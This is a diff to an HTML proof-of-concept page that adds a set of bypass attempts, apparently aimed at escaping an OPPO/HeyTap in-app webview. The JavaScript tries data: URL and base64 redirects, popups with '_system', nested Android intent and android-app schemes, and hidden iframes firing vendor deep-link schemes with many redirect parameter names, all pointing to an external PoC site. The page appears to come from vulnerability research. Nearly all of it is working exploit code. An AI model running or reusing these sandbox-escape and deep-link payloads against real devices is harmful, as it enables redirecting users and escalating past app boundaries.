@@ -147,6 +147,18 @@
     </div>
 
     <div class="card">
+        <h3>4.5 More Bypass Attempts</h3>
+        <div class="section">
+            <button onclick="tryDataUrl()">data: URL → redirect to PoC</button>
+            <button onclick="tryBase64Redirect()">Base64 encoded redirect</button>
+            <button onclick="tryPopup()">window.open popup</button>
+            <button onclick="tryNestedIntent()">Double-scheme intent</button>
+            <button onclick="tryUrlParams()">Various URL params</button>
+        </div>
+        <pre id="bypass-log">Click buttons above</pre>
+    </div>
+
+    <div class="card">
         <h3>5. HyperJsbridge Escalation</h3>
         <div class="section">
             <button onclick="tryBridgeEscalation()">
@@ -372,6 +384,71 @@
             } catch (e) {
                 el.textContent += `Error: ${e.message}\n`;
             }
+        };
+
+        // New bypass techniques
+        const pocUrl = 'https://youichi-uda.github.io/oppo-game-poc/';
+        const bypassLog = (msg) => {
+            const el = document.getElementById('bypass-log');
+            el.textContent = msg + '\n' + el.textContent;
+        };
+
+        const tryDataUrl = () => {
+            bypassLog('Trying data: URL with meta refresh');
+            const html = `<html><head><meta http-equiv="refresh" content="0;url=${pocUrl}"></head><body>Redirecting...</body></html>`;
+            const dataUrl = 'data:text/html;charset=utf-8,' + encodeURIComponent(html);
+            window.location = dataUrl;
+        };
+
+        const tryBase64Redirect = () => {
+            bypassLog('Trying base64 encoded data URL');
+            const html = `<html><script>location='${pocUrl}'<\/script></html>`;
+            const b64 = btoa(html);
+            window.location = 'data:text/html;base64,' + b64;
+        };
+
+        const tryPopup = () => {
+            bypassLog('Trying popup with various flags');
+            // Try multiple popup approaches
+            window.open(pocUrl, 'popup', 'width=400,height=600');
+            window.open(pocUrl, '_system');
+            window.open(pocUrl, '_blank', 'location=yes');
+        };
+
+        const tryNestedIntent = () => {
+            bypassLog('Trying nested/double scheme');
+            const urls = [
+                'intent://view#Intent;scheme=https;S.browser_fallback_url=' + encodeURIComponent(pocUrl) + ';end',
+                'intent:#Intent;action=android.intent.action.VIEW;S.android.intent.extra.URL=' + pocUrl + ';end',
+                'android-app://com.android.chrome/https/youichi-uda.github.io/oppo-game-poc/',
+                'googlechrome://navigate?url=' + encodeURIComponent(pocUrl),
+            ];
+            urls.forEach((url, i) => {
+                setTimeout(() => {
+                    bypassLog('Trying: ' + url.substring(0, 50) + '...');
+                    window.location = url;
+                }, i * 1000);
+            });
+        };
+
+        const tryUrlParams = () => {
+            bypassLog('Trying various parameter names');
+            const params = ['url', 'link', 'redirect', 'target', 'goto', 'next', 'return', 'callback', 'dest', 'r'];
+            const schemes = ['htcloud://cloud.heytap.com/route?', 'oaps://theme/web?', 'postmanservice://open?'];
+
+            schemes.forEach(scheme => {
+                params.forEach(param => {
+                    const fullUrl = scheme + param + '=' + encodeURIComponent(pocUrl);
+                    bypassLog('Trying: ' + fullUrl.substring(0, 60));
+
+                    // Try via iframe to not navigate away
+                    const iframe = document.createElement('iframe');
+                    iframe.style.display = 'none';
+                    iframe.src = fullUrl;
+                    document.body.appendChild(iframe);
+                });
+            });
+            bypassLog('Created iframes for all combinations');
         };
 
         log('Escalation test page loaded');
